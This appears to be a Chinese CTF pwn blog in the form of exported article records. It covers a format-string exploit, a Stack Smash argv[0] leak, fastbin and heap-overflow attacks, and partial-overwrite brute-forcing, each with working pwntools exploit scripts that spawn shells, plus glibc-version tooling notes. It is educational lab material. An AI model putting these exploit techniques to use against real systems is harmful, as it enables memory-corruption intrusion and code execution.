首先要明白的一点是，只要w被修改为0，我们永远没有办法再次修改w。因为修改完w后，程序的唯一漏洞点就无法被访问了。因此，我们必须在修改w之前就改变程序运行流程，让其再次执行printf（显然一次fmt不可能利用）。 于是就只能劫持第二个printf的return address，这样w就修改不到了。具体的地址就是leak addr - 0x8。当然此时payload空间还有剩余，我们需要将libc地址一起泄露。 payload = \"%{}c%10$hn\".format(0x10b0).encode() payload += \"%{}c%11$hn\".format(0xffff-0x10b0).encode() payload += \"%19$p\".encode() payload = payload.ljust(0x20,b\"a\") payload += p64(stack_addr-0x8) payload += p64(0x404010) p.recv() p.send(payload) 这里返回地址可以改为很多，比如改为_start或者直接改到main。但是改到main的时候需要注意栈对齐的问题。 接着第二次printf就可以使用ret2csu构造system(’/bin/sh’)。这里需要注意由于printf的fmtstr还在栈上，需要多pop几次将前面脏数据先pop掉，接着直接放入/bin/sh和system即可。 payload = \"%{}c%8$hn\".format(0x12ce).encode() payload = payload.ljust(0x10,b\"a\") payload += p64(stack_addr-0x8 - 0x150) payload += p64(0x00000000004012d3) payload += p64(libc_base + next(libc.search(b\"/bin/sh\\x00\"))) payload += p64(libc_base + 0x51cd0 + 0x2) 还是经验太少，利用手段太单一，不能灵活使用。exploit如下： from pwn import* # context.log_level = \"debug\" elf = ELF(\"./ez_fmt\") context.terminal=['tmux','splitw','-h'] libc = elf.libc p = process(\"./ez_fmt\") # p = remote(\"47.104.24.40\",1337) p.recvuntil(\"0x\") stack_addr = int(p.recv(12),16) print(hex(stack_addr)) payload = \"%{}c%10$hn\".format(0x10b0).encode() payload += \"%{}c%11$hn\".format(0xffff-0x10b0).encode() payload += \"%19$p\".encode() payload = payload.ljust(0x20,b\"a\") payload += p64(stack_addr-0x8) payload += p64(0x404010) p.recv() p.send(payload) p.recvuntil(\"0x\") libc_base = int(p.recv(12),16) - libc.sym[\"__libc_start_main\"] - 243 print(hex(libc_base)) \"\"\" 0xe3afe execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL 0xe3b01 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL 0xe3b04 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL \"\"\" one_gadget = libc_base + 0xe3afe payload = \"%{}c%8$hn\".format(0x12ce).encode() payload = payload.ljust(0x10,b\"a\") payload += p64(stack_addr-0x8 - 0x150) payload += p64(0x00000000004012d3) payload += p64(libc_base + next(libc.search(b\"/bin/sh\\x00\"))) payload += p64(libc_base + 0x51cd0 + 0x2) p.recv() p.send(payload) p.interactive() ","date":"2023-12-19","objectID":"/articles/2023/12/qwb2023pwn/:1:0","tags":["Pwn","CTF","Writeup"],"title":"2023强网杯Pwn-WP","uri":"/articles/2023/12/qwb2023pwn/"},{"categories":["Pwn"],"content":"Stack Smash Stack Smash是一种利用Canary机制本身的缺陷达到信息泄露效果的一种栈溢出利用方式。该方法不需要绕过Canary保护就可以泄露内存或栈中保存的信息。大概原理是：当Canary机制检测到栈溢出时（也就是自身的值被改写的时候），会触发__stack_chk_fail函数，这个函数又会调用__fortify_fail函数向屏幕上输出一段信息来提示用户检测到栈溢出，随后程序被终止运行。提示的内容如下所示： 这时我们会发现，这个提示还会输出当前文件的路径，那么我们是否可以利用这个路径带出一些其他东西呢。先来看下__stack_chk_fail的源码： #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e extern char **__libc_argv attribute_hidden; void __attribute__ ((noreturn)) __stack_chk_fail (void) { __fortify_fail (\"stack smashing detected\"); } strong_alias (__stack_chk_fail, __stack_chk_fail_local) __stack_chk_fail函数只是调用了__fortify_fail (\"stack smashing detected\")而已，我们继续看__fortify_fail的源码： #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e extern char **__libc_argv attribute_hidden; void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) { /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"\u003cunknown\u003e\"); } libc_hidden_def (__fortify_fail) __fortify_fail函数则是负责调用__libc_message输出栈溢出信息。由于每个程序的argv[0]变量都存放着程序的名称，那么这个函数就会同时将程序名称打印出来。 值得一提的是，__libc_argv[0]也存在于栈上，因此我们借助栈溢出的机会可以同时修改它的值，让它指向我们想要的内存区域。那么最后它就会帮我们泄露内存信息。 此漏洞仅限Glibc 2.30及之前的版本，较新的Glibc不再输出argv[0]。 ","date":"2023-12-13","objectID":"/articles/2023/12/stack_smash/:1:0","tags":["Pwn","CTF","Stack"],"title":"Stack Smash Attack","uri":"/articles/2023/12/stack_smash/"},{"categories":["Pwn"],"content":"Exploit 以经典的Stack Smashing题目演示利用手段。题目为2021鹤城杯 easyecho。 实际上在Stack Smashing的利用过程中只需要考虑一件事情，就是找到__libc_argv[0]在栈上的位置（相对溢出点的位置），这样我们才能覆盖。其他的一切libc会帮我们完成。 一种方法是直接在栈上找，观察栈上有没有存放着有关程序路径的地方，下面就是一个可疑点： 此处存放着0x7fffffffde18，而0x7fffffffde18又指向0x7fffffffe0c9，我们发现0x7fffffffe0c9处刚好存放着程序路径。也就是说，0x7fffffffde18就是argv[0]。 第二种方法直接在gdb上打印__libc_argv[0]变量的地址即可。 最终确定argv[0]在0x7fffffffde18的地址处。 为什么一定要获得指向path的地址而不是直接修改path？当然是都可以，但是哪种方便呢？ 继续观察溢出点，发现argv[0]在栈上的位置相对于溢出点相差0x7fffffffde18-0x7fffffffdcb0=0x168字节的位置。那么我们填满0x168字节后既可以覆盖到argv[0]。 根据题目，flag存放在base + 0x202040的地方（base是程序基址)。于是payload就为： flag = base + 0x202040 payload = 0x168 * b'A' + p64(flag) 由于0x168个字节早就覆盖掉rbp了，因此直接结束程序就可以看到结果： 完整的exp: from pwn import * from pwn import p64,u64 context.terminal=['tmux','splitw','-h'] # context.log_level='debug' elf = ELF('./easyecho') r = elf.process() # r = remote('node4.anna.nssctf.cn',28710) payload = b'A' * 0x10 r.sendafter(b'Name: ',payload) r.recv(24) base = u64(r.recv(6).ljust(8,b'\\x00')) - 0xcf0 info(hex(base)) # gdb.attach(r) # pause() r.sendlineafter(b'Input: ',b'backdoor') flag = base + 0x202040 payload = 0x168 * b'A' + p64(flag) r.sendlineafter(b'Input: ',payload) r.sendlineafter(b'Input: ', b'exitexit') r.interactive() ","date":"2023-12-13","objectID":"/articles/2023/12/stack_smash/:2:0","tags":["Pwn","CTF","Stack"],"title":"Stack Smash Attack","uri":"/articles/2023/12/stack_smash/"},{"categories":["Pwn"],"content":"由于不同版本的libc功能差异大，甚至无法兼容运行。同时，随意的更改系统libc版本会导致系统的崩溃。下面就Pwn有关堆利用的题目中涉及到切换libc版本的场景做出解决方案。 ","date":"2023-12-12","objectID":"/articles/2023/12/cglibc/:0:0","tags":["Pwn","Docker","Glibc","CTF"],"title":"彻底解决Glibc版本问题","uri":"/articles/2023/12/cglibc/"},{"categories":["Pwn"],"content":"如何查看libc版本 首先，libc的动态链接文件libc.so.6是可执行文件，那么我们再赋予其可执行权限后可以直接运行来获得libc版本。 $ chmod +x libc.so.6 $ ./libc.so.6 # GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. # Copyright (C) 2022 Free Software Foundation, Inc. # This is free software; see the source for copying conditions. # There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A # PARTICULAR PURPOSE. # Compiled by GNU CC version 11.2.0. # libc ABIs: UNIQUE IFUNC ABSOLUTE # For bug reporting instructions, please see: # \u003chttps://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u003e. 可以看出上述libc的版本为2.35，是ubuntu22.04中的预装版本。 同时，通过执行系统库中的libc文件，可以获得系统libc版本。 $ /lib/x86_64-linux-gnu/libc.so.6 # GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.5) stable release version 2.35. #Copyright (C) 2022 Free Software Foundation, Inc. # This is free software; see the source for copying conditions. # There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A # PARTICULAR PURPOSE. # Compiled by GNU CC version 11.4.0. # libc ABIs: UNIQUE IFUNC ABSOLUTE # For bug reporting instructions, please see: # \u003chttps://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u003e. 另外，ldd --version也可以起到同样的效果。 $ ldd --version # ldd (Ubuntu GLIBC 2.35-0ubuntu3.5) 2.35 # Copyright (C) 2022 Free Software Foundation, Inc. # This is free software; see the source for copying conditions. There is NO # warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. # Written by Roland McGrath and Ulrich Drepper. ","date":"2023-12-12","objectID":"/articles/2023/12/cglibc/:1:0","tags":["Pwn","Docker","Glibc","CTF"],"title":"彻底解决Glibc版本问题","uri":"/articles/2023/12/cglibc/"},{"categories":["Pwn"],"content":"题目给定了低版本程序 当题目使用低版本libc编译程序后，在高版本上可能无法直接运行程序。这时我们可以使用glibc-all-in-one和patchelf程序修改程序所链接的libc版本。 patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 ./prog patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ./prog 首先需要使用glibc-all-in-one工具下载相应版本的libc（注意，该工具下载的编译好的libc是带debug符号的，可以直接使用gdb调试）。然后只需要使用上两行命令（不需要再更改特定lib），即可完成libc路径修改。并且此时可以直接调试程序。 ","date":"2023-12-12","objectID":"/articles/2023/12/cglibc/:2:0","tags":["Pwn","Docker","Glibc","CTF"],"title":"彻底解决Glibc版本问题","uri":"/articles/2023/12/cglibc/"},{"categories":["Pwn"],"content":"自行编译低版本程序 如果使用Ubuntu22.04所使用的gcc版本编译程序，同时想使用patchelf将其libc版本变更为低版本，即使操作成功，运行程序时也会报错。 至少我个人找不到从程序层面的解决办法。这时使用docker可以快速解决此类问题。 首先需要明确下各版本Ubuntu默认安装的libc版本。 Ubuntu22.04：libc-2.35 Ubuntu20.04：libc-2.31 Ubuntu18.04：linc-2.27 Ubuntu16.04：libc-2.23 Ubuntu14.04：libc-2.19 然后从Ubuntu的docker库中pull相应版本的image下来。例如我想要使用2.23版本的glibc，那么我需要Ubuntu16.04. docker pull ubuntu:16.04 接着，在你想要的任意文件夹中，创建一个Dockerfile文件，内容如下： # 使用Ubuntu 16.04为基础镜像 FROM ubuntu:16.04 # 设置工作目录 WORKDIR / # 安装编译工具 RUN apt-get update \u0026\u0026 \\ apt-get install -y build-essential 除了基础镜像的版本需要改动，其他均不需要改动，然后在该目录下构建包含gcc的image。 docker build -t ubuntu16.04-gcc . ubuntu16.04-gcc是image的名称，可以自行选择。等待构建完成后，使用以下命令来创建一次性容器并进入/bin/bash： docker run -it --rm -v $(pwd):/app -w /app ubuntu16.04-gcc /bin/bash 简单解释以下，-it是使用交互模式，–rm构建一次性镜像，退出即销毁。$(pwd):/app指将当前目录挂载到容器中的/app目录（挂载的意思是容器内部拥有可读可写权限）。-w /app是指工作目录设为/app，换句话说进入容器就跳转到/app下，ubuntu16.04-gcc是使用的image，/bin/bash是执行的程序，它为我们提供shell。 进去后，直接使用gcc编译你想要的源码，再Crtl-D退出，即可编译出一个低libc版本的C程序。 此时再使用patchelf更换libc则不会出现问题。 上面构建的image每次都可以重复使用，只需使用时创建容器即可，速度非常迅速。 ","date":"2023-12-12","objectID":"/articles/2023/12/cglibc/:3:0","tags":["Pwn","Docker","Glibc","CTF"],"title":"彻底解决Glibc版本问题","uri":"/articles/2023/12/cglibc/"},{"categories":["Pwn"],"content":"关于Fastbin机制 在Glibc 2.25及之前的版本中，如果free的chunk大小小于get_max_fast()，也就是全局变量global_max_fast的值，那么他就会被放入Fastbin的链表中。前面说过，Fastbin实际上是一个单链表，它通过free chunk的fd指针来链接chunks。每当有新的chunk加入Fastbin，Fastbin就会将此chunk插入链表的开头。这里我们看下free函数中有关Fastbin的部分： if ((unsigned long)(size) \u003c= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ \u0026\u0026 (chunk_at_offset(p, size) != av-\u003etop) #endif ) { if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size)) \u003e= av-\u003esystem_mem, 0)) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if (have_lock || ({ assert (locked == 0); __libc_lock_lock (av-\u003emutex); locked = 1; chunksize_nomask (chunk_at_offset (p, size)) \u003c= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) \u003e= av-\u003esystem_mem; })) { errstr = \"free(): invalid next size (fast)\"; goto errout; } if (! have_lock) { __libc_lock_unlock (av-\u003emutex); locked = 0; } } free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = \u0026fastbin (av, idx); /* Atomically link P to its fastbin: P-\u003eFD = *FB; *FB = P; */ mchunkptr old = *fb, old2; unsigned int old_idx = ~0u; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if (have_lock \u0026\u0026 old != NULL) old_idx = fastbin_index(chunksize(old)); p-\u003efd = old2 = old; } while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); if (have_lock \u0026\u0026 old != NULL \u0026\u0026 __builtin_expect (old_idx != idx, 0)) { errstr = \"invalid fastbin entry (free)\"; goto errout; } } 这里需要注意的是以下几点： 在插入链表前首先要计算idx。由于Fastbin不只有一个链，不同大小的chunk会放在不同的链上。 45行开始，free会检查Fastbin链表的首元素。如果本次释放的仍然是这个元素，那么就会throw double free的错误。但是由于free只检查首元素，那么存在于链表后部的chunk是否被double free是检查不出来的。 接着来看malloc部分有关Fastbin的内容，即如果用户malloc的大小不超过global_max_fast的值，那么就直接从Fastbin中取一块符合要求的chunk返回。 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) \u003c= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); mfastbinptr *fb = \u0026fastbin (av, idx); mchunkptr pp = *fb; do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-\u003efd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } 这里安全性检查的部分只有一个地方，22行。当取出该chunk之前，会首先检查该chunk的size部分是不是和它所存放在的fastbin链表的idx值相同。假如说取出的是0x30的chunk，那么改chunk的size区域的8byte的值也必须是0x30（当然实际情况应该是0x31，因为有AMP三位的存在。但是chunksize()函数会忽略掉低三位）。 根据上面的源码分析，我们可以发现Fastbin机制对chunk的安全性检查并不是很多。所以，我们可以利用以下缺陷进行漏利用。 ","date":"2023-12-12","objectID":"/articles/2023/12/fastbin_attack/:1:0","tags":["CTF","Pwn","Heap","Fastbin"],"title":"Fastbin Attack","uri":"/articles/2023/12/fastbin_attack/"},{"categories":["Pwn"],"content":"修改fd指针 ","date":"2023-12-12","objectID":"/articles/2023/12/fastbin_attack/:2:0","tags":["CTF","Pwn","Heap","Fastbin"],"title":"Fastbin Attack","uri":"/articles/2023/12/fastbin_attack/"},{"categories":["Pwn"],"content":"Heap Overflow 由于malloc的一块区域很可能是程序上次free的，同时free了之后并不会清空chunk的data。那么如果出现了heap overflow， 并且fastbin已经成链的情况下，我们可以通过覆写free chunk的fd的数据，来将我们想要的内存区域放入Fastbin中，然后再malloc取出想要的内存区域进行读写。下面是Nu1L Book中的一个简单例子： /*Glibc 2.23*/ #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e typedef struct animal { char desc[0x8]; size_t lifetime; }Animal; void main() { Animal *A = malloc(sizeof(Animal)); Animal *B = malloc(sizeof(Animal)); Animal *C = malloc(sizeof(Animal)); char *target = malloc(0x10); memcpy(target,\"THIS IS A SECRET\", 0x10); malloc(0x80); free(C); free(B); char *payload = \"AAAAAAAAAAAAAAAAAAAAAAAA\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x60\"; memcpy(A-\u003edesc, payload, 0x21); Animal *D = malloc(sizeof(Animal)); Animal *E = malloc(sizeof(Animal)); write(1,E-\u003edesc,0x10); } 由于是演示代码，那就一边调试一边看好了。我们首先先将前面的四个malloc过掉，看下目前heap的结构： 自上而下3个0x20的chunk就是我们malloc 的三个。0x602060的chunk是target块。我们接着向下，向target内写入0x10个字符： 写入成功，到此时也没有什么问题。接下来还有一个malloc(0x80)，和两个free，我们直接过掉free，再次看看bins和heap的结构： 此时fastbin是由B指向C的，因为先释放的C。同时heap中的B、C变成了free chunk。接下来，我们对A chunk（0x602000）进行overflow，试图修改已经free掉的B chunk的fd指针。为了满足安全性检测，我们不能改变B chunk中size的值。于是，payload如下： char *payload = \"AAAAAAAAAAAAAAAAAAAAAAAA\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x60\"; 写入后的效果为： 我们通过修改B chunk fd的低位地址0x20至0x60，可以将bins的链表改为B指向target。而由于C从fastbin中解链，自然变为了Allocated chunk。此时，我们只需要malloc两次，便可以获得target chunk，也就是0x602060这片区域。 最后一次malloc也是成功返回了target chunk的data部分并且输出了target chunk中的内容。 ","date":"2023-12-12","objectID":"/articles/2023/12/fastbin_attack/:2:1","tags":["CTF","Pwn","Heap","Fastbin"],"title":"Fastbin Attack","uri":"/articles/2023/12/fastbin_attack/"},{"categories":["Pwn"],"content":"修改fd指针低位 由于系统ASLR的限制，想要对某一块内存进行修改，必须知道目标内存的地址，这往往需要其他漏洞来泄露内存。但是堆的分配在系统中的偏移是固定的，分配的堆内存地址相对于堆内存的基地址是固定的。因此，我们只需要修改free chunk中fd指针的低位就可以指向我们想要的chunk，不需要进行信息泄露就可以进行内存的Overlap攻击。 ","date":"2023-12-12","objectID":"/articles/2023/12/fastbin_attack/:2:2","tags":["CTF","Pwn","Heap","Fastbin"],"title":"Fastbin Attack","uri":"/articles/2023/12/fastbin_attack/"},{"categories":["Pwn"],"content":"Double Free 即使Ptmalloc2会检查Fastbin的第一个chunk是否是当前被free的chunk，从而来检查是否存在double free。但是它并不检查fastbin中的其它chunk。那么就可以先free另一个chunk，再进行double free就不会被检查到。假如此时我们释放了A，再释放了B，接着释放A，则可以得到A-\u003eB-\u003eA-\u003eB……这样一个无限循环的链表。那么此时如果malloc一个相同大小的chunk，就会得到一个“既死又活”的A chunk。那么我们对malloc的块进行修改，就可以同时改掉fastbin的链，让A指向我们想要覆写的区块，然后再malloc2次获得此区块。该部分演示见 how2heap-Fastbin dup，这里不再演示。 ","date":"2023-12-12","objectID":"/articles/2023/12/fastbin_attack/:2:3","tags":["CTF","Pwn","Heap","Fastbin"],"title":"Fastbin Attack","uri":"/articles/2023/12/fastbin_attack/"},{"categories":["Pwn"],"content":"改写Global Max Fast 由于arena的位置在glibc的bss段 我们可以通过改写全局变数Global Max Fast的值，处理特定大小的chunk，进而可以在arena往后的任意地址写入一个堆地址。 ","date":"2023-12-12","objectID":"/articles/2023/12/fastbin_attack/:2:4","tags":["CTF","Pwn","Heap","Fastbin"],"title":"Fastbin Attack","uri":"/articles/2023/12/fastbin_attack/"},{"categories":["Pwn"],"content":"Heap Overflow 堆溢出的概念其实和栈溢出、缓冲区溢出的概念非常相似，而且就连利用方式也非常相似，因为chunk之间是连续的。那么只要有read或者get函数的不规范使用，依然可以通过当前的chunk修改相邻chunk的内容。但是这个威胁就小很多，因为heap中不会保存程序运行的状态内容，基本都是用户数据，所以在heap中没有办法劫持程序的运行流程（PC寄存器）。但是，heap中往往存在用户数据，复写后可能导致越权之类的现象出现。下面以一个非常简单的example理解heap overflow。 ","date":"2023-12-11","objectID":"/articles/2023/12/heap_overflow/:1:0","tags":["Pwn","CTF","Heap"],"title":"堆溢出利用","uri":"/articles/2023/12/heap_overflow/"},{"categories":["Pwn"],"content":"[NISACTF 2022]ezheap 程序其实非常简单，就是连续call了两个0x16的malloc，然后只往第一个chunk写数据，通过heap overflow覆写第二个chunk的数据，然后利用system函数getshell。这里有一个要注意的点是由于是i386程序，0x16的malloc实际上要对齐到0x20的。由于相邻的两个chunk都有0x4的chunk_size，那我们输入0x20个字符就可以刚好覆盖到下一个chunk的data部分，写入/bin/sh即可。 我们先观察写入前的chunks： 这里可以看出来0x21e29那个是top chunk。我们将数据写入： 这边就发现一个很有意思的问题，就是data部分并不是紧跟着size的。而是空出了4个字节。我们再看下刚好输入0x16个字节的chunk情况： 我们发现它既在header补了4字节，又在chunk的末尾补了2字节🤣。这种对齐的方式还是挺让人难以捉摸的。不管了，反正最后成功getshell了。 ","date":"2023-12-11","objectID":"/articles/2023/12/heap_overflow/:2:0","tags":["Pwn","CTF","Heap"],"title":"堆溢出利用","uri":"/articles/2023/12/heap_overflow/"},{"categories":["Pwn"],"content":"Exploit from pwn import * context.terminal=['tmux','splitw','-h'] elf = ELF('./pwn') r = elf.process() # r = remote('node5.anna.nssctf.cn',28186) payload = b'a' * 0x20 + b'/bin/sh\\x00' r.recvuntil(b'Input:\\n') r.sendline(payload) r.interactive() ","date":"2023-12-11","objectID":"/articles/2023/12/heap_overflow/:3:0","tags":["Pwn","CTF","Heap"],"title":"堆溢出利用","uri":"/articles/2023/12/heap_overflow/"},{"categories":["Pwn"],"content":" 本节内容基于Glibc 2.25版本 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:0:0","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"什么是堆 堆（chunk）内存是一种允许程序在运行过程中动态分配和使用的内存区域。相比较于栈内存和全局内存，堆内存没有固定的生命周期和固定的内存区域。程序可以动态地申请和释放不同大小的内存。被分配后，如果没有进行明确的释放操作，该堆内存区域都是一直有效的。 绿色部分就是程序申请的堆区（main_arena）。 为了进行高效的堆内存分配（高效往往带来安全性问题），回收和管理，Glibc实现了Ptmalloc2的堆管理器。下面的介绍仅基于Ptmalloc2堆管理器的实现。 在https://elixir.bootlin.com/可以查看到各版本的Ptmalloc2源码，当然也包括Glibc中其他实现的源码。 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:1:0","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"Chunk Ptmalloc2所分配的堆的最基本结构为Chunk。首先我们需要了解一下Ptmalloc2分配堆空间的流程： 程序中第一次使用malloc时初始化main_arena，并向Kernel申请一大块内存空间（在上图中大约为132KB）。接着从刚刚申请的heap区域切割一块区域作为malloc的返回。 main_arena存在于libc中，记录着有关堆的各种信息。 各种bins的链表位置 Top chunk的地址 …… 程序以后的malloc/free实际上都是对chunk的回收和再利用，回收和利用的途径就是main_arena中记录的bins链表。 除非第一次申请的内存空间不够，否则Ptmalloc2不会再次向Kernel申请区域，因为和内核的交互太消耗时间。 不同于栈，堆的生长方向是自低地址向高地址生长。最高的地址是Top chunk，其次越先分配的chunk地址越小。 chunk在Glibc中的定义如下： struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; 根据chunk的定义，普通chunk的结构大概分为chunk header和chunk data两部分，具体示意图如下： prev_size/data：临近的上一个Chunk的size或者data size：此Chunk的size A(NON_MAN_ARENA bit)：是否由其他的arena管理，而不是main_arena M(IS_MMAPPED bit)：是否由mmap创造出来 P(PREV_INUSE bit)：临近的上一个Chunk是否正在使用 首先，prev_size/data其实就是上一个chunk的data部分（用户可以使用的区域）。但是如果上一个chunk被free了，那么就只做prev_size的用处。 malloc的内存大小实际上不等于chunk size，chunk size的计算方式如下： #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \u003c MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK) 这样已经很好理解了，就是在malloc请求的大小的基础上加上size的8byte，然后再和8byte对齐即可。举个例子：假设var = req + 8，如果var的值0x21-0x2f，则对齐为0x30，而若var=0x20则不需要对齐。 在Ptmalloc2中，总共有三种形式的Chunk，分别是Allocated Chunk，Free Chunk，Top Chunk。 Allocated Chunk，即正在使用的Chunk，结构如上图所示。由于inuse，它的临近的下一个chunk的P bit会被设置为1。 Free Chunk，即free掉的chunk，这些chunk实际上会根据不同的size进入不同的bins链表中。它的结构如下所示：其中，fd为Forward Pointer，指向下一个Free的Chunk；bk为Backward Pointer，指向上一个Free掉的Chunk。bins通过fd和bk指针维持其链表结构。 Top Chunk，在Heap的顶端（最高地址），代表着剩余的空间。 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:2:0","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"Bins 为了高效的管理内存并且尽可能防止内存碎片，Ptmalloc2将不同大小的free chunk分为不同的bin结构，分别为Fast Bin、Small Bin、Large Bin、Unsorted Bin。 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:3:0","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"Fast Bin 如果chunk被释放时发现大小满足Fast Bin的要求，即在（0x20 - 0x80）之间，则将该chunk放入Fast Bin，且放入后不修改P标志位的数值。Fast Bin以单链表的形式储存，不同大小的Fast Bin储存在对应大小的单链表结构中，其单链表的存取机制是LIFO。也就是说，新加入的chunk永远在表头的位置，指向上一个加入的chunk。 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:3:1","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"Small Bin Small Bin的所允许的大小更大一点，在（0x20-0x400）之间，而且放入的chunk链表为双链表结构（fd下一个chunk，bk上一个chunk），存取方式为FIFO，速度比Fast Bin稍慢一点。 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:3:2","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"Large Bin 可以存取大于0x400字节的chunk。Large Bin的结构相对于其他Bin是最复杂的，速度也是最慢的，相同大小的Large Bin使用fd和bk指针连接，不同大小的Large Bin通过fd_nextsize和bk_nextsize按照大小排序连接。 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:3:3","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"Unsorted Bin Unsorted Bin是Ptmalloc2堆管理器的真正意义上的垃圾桶。chunk被释放后，会先加入Unsorted Bin，等待下次分配使用。在Unsorted Bin不为空的时候，如果Fast Bin和Small Bin中都没有合适的chunk，用户申请内存就会从Unsorted Bin中寻找，如果找到符合申请大小要求的chunk，则直接分配，或者分割该chunk。 ","date":"2023-12-07","objectID":"/articles/2023/12/heap_intro/:3:4","tags":["Pwn","CTF","Heap"],"title":"堆基础","uri":"/articles/2023/12/heap_intro/"},{"categories":["Pwn"],"content":"我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。 正常情况我们不能写入12位，只能写入16位，因此我们只能猜测最后4位（一个16进制位）的数值，然后循环碰撞即可。 while True: try: io = process(\"./babypie\", timeout = 1) # gdb.attach(io) io.sendafter(\":\\n\", 'a' * (0x30 - 0x8 + 1)) io.recvuntil('a' * (0x30 - 0x8 + 1)) canary = '\\0' + io.recvn(7) success(canary.encode('hex')) # gdb.attach(io) io.sendafter(\":\\n\", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\\x3E\\x0A') io.interactive() except Exception as e: io.close() print e 注意：gets()、printf()等字符串输入函数会在输入末尾加上\\x00导致部分写失败。部分写只在read()上使用。 ","date":"2023-11-10","objectID":"/articles/2023/11/partial_overwrite/:0:0","tags":["Pwn","CTF"],"title":"部分写固定思路","uri":"/articles/2023/11/partial_overwrite/"},{"categories":["Pwn"],"content":"之前大大小小的题目中都遇到了格式化字符串漏洞，但是长时间不做还是会有点懵逼 首先，格式化字符串的危险函数有很多，但是实际上最常用的还是printf。printf可以有很多参数，但是第一个固定为fmt参数。printf的参数分布和正常函数的参数分布一致： x86：栈 x64：RDI, RSI, RDX, RCX, R8, R9, 栈 我们知道，fmt的格式大概如下所示： \"Hello %d, %s\" fmt中每遇到一个%后就会在下一个参数寻找值按照格式输出，无论该值是否由printf函数提供。 那么，由于fmt字符串占用第一个参数，第n个%所寻找的参数即为printf的第n+1个参数，或者说相对于fmt字符串第n个参数。这一点需要牢记。按照此规则结合正常函数的参数储存机制即可定位指定栈位置的内容。 